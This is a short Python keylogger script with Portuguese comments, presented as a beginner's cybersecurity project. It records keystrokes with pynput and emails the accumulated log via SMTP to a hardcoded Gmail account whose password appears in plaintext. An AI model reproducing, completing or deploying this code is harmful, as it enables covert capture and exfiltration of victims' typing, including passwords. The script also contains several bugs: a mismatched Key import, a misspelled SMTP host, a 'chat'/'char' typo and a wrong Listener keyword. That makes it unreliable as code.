# primeiro projeto real em cyber seguranca

import smtplib 

from pynput.keyboard import key, Listener # por algum motivo (ate entao desconhecido) nao esta puxando a biblioteca

email = 'keylogg3215@gmail.com' #email para envio
password = 'Keylogger1515' #gmail tirou a fun;'ao de login por terceiros
server = smtplib.SMTP_SSL('smt.gmail.com', 465)
server.login(email, password)

fulllog = ''
words = ''
email_char_limit = 100 #limite de palavras digitadas

def on_presss(key):
    global words
    global fulllog
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        words+= ' '
        fulllog+= words
        words = ''
        if len(fulllog) >= email_char_limit:     #mandar os registros que batem com a quantidade proposta
            send_log()
            fulllog = ''
    elif key == Key.shift_l or key == Key.shift_r: #teclas shift 
        return
    elif key == Key.backspace:
        words = words[:-1]
    else:
        char = f'{key}'
        char = chat[1:-1]
        words += char

    if key == Key.esc:   #tecla ESC
        return False            
    
def send_log():
    server.sendmail(
        email,
        email,
        fulllog 

    )
with Listener(on_presss=on_presss) as listener:
    listener.join()
